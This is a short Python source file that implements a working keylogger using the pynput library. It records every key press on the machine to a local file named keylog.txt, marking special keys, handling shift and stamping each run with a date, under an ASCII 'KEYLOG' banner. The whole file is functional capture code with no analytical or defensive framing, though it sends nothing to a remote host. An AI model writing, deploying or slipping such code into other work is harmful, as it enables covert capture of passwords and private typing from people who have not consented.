import os
from datetime import datetime
from pynput import keyboard

key_list = list()
shift = False


logo = (
    '██╗  ██╗███████╗███████╗██╗      ██████╗  ██████╗ \n' +
    '██║ ██╔╝██╔════╝██╔════╝██║     ██╔═══██╗██╔════╝ \n' +
    '█████╔╝ █████╗  █████╗  ██║     ██║   ██║██║  ███╗\n' +
    '██╔═██╗ ██╔══╝  ██╔══╝  ██║     ██║   ██║██║   ██║\n' +
    '██║  ██╗███████╗███████╗███████╗╚██████╔╝╚██████╔╝\n' +
    '╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝  ╚═════╝ \n' +
    ''
)


def log(list_of_keys):
    global shift
    with (open('keylog.txt', 'a') as keylog):
        result = ''
        for key in list_of_keys:
            if key == keyboard.Key.space:
                result = ' '
            elif key == keyboard.Key.enter:
                result = '\n'
            elif key in [keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r]:
                shift = True
            elif 'Key' in str(key):
                result = "~" + str(key).upper() + "~"
            else:
                result = str(key).replace("'", '')

            if shift:
                result = result.upper()
                shift = False

            keylog.write(result)
            list_of_keys.clear()


def key_pressed(key):
    try:
        key_list.append(key)    # Save key to list of keys
        log(key_list)           # Log list of keys
    except:
        pass


try:
    if not os.path.isfile('keylog.txt'):
        with (open('keylog.txt', 'w') as new_file):
            new_file.write(logo)
            new_file.write("NEW RUN " + datetime.now().strftime('%m/%d/%Y, %H:%M:%S\n'))
    else:
        with (open('keylog.txt', 'a') as existing_file):
            existing_file.write("\n\nNEW RUN " + datetime.now().strftime('%m/%d/%Y, %H:%M:%S\n'))

    with keyboard.Listener(on_press=key_pressed) as listener:
        listener.join()
except KeyboardInterrupt:
    pass
